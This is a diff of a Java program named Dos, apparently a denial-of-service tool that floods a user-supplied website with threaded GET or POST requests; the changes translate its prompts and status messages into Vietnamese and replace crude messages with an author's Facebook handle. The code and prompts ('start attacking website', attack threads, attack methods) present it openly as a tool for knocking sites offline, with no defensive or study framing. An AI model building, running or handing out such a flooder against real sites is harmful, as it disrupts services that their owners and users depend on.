@@ -52,23 +52,23 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url: ");
+        System.out.print("Nhập URL Trang Web: ");
         url = in.nextLine();
         System.out.println("\n");
-        System.out.println("Starting Attack to url: " + url);
+        System.out.println("Bắt Đầu Tấn Công Trang Web: " + url);
 
         String[] SUrl = url.split("://");
 
-        System.out.println("Checking connection to Site");
+        System.out.println("Kiểm Tra Kết Nối Trang Web...");
         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Nghịch Ngu By: Shin Plus");
+        System.out.println("© Copyright: Shin Plus");
 
-        System.out.print("Thread: ");
+        System.out.print("Số lượng tấn công: ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method: ");
+        System.out.print("Thời gian tấn công: ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Đang Bắt Đầu Bú Cu");
+        System.out.println("Starting ...");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -117,7 +117,7 @@ public class Dos implements Runnable {
     }
 
     private void checkConnection(String url) throws Exception {
-        System.out.println("Checking Connection");
+        System.out.println("Kiểm Tra Kết Nối Trang Web...");
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
@@ -125,13 +125,13 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("Connected to website");
+            System.out.println("Kết Nối Với Website Thành Công");
         }
         Dos.url = url;
     }
 
     private void sslCheckConnection(String url) throws Exception {
-        System.out.println("Checking Connection (ssl)");
+        System.out.println("Kiểm Tra Kết Nối (ssl)");
         URL obj = new URL(url);
         HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
@@ -139,7 +139,7 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("Connected to website");
+            System.out.println("Kết Nối Với Website Thành Công");
         }
         Dos.url = url;
     }
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("FB: ShinMedia123: " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("FB: ShinMedia123 : " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("FB: ShinMedia123 :" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("FB: ShinMedia123 : " + responseCode + "Thread: " + this.seq);
     }
 }
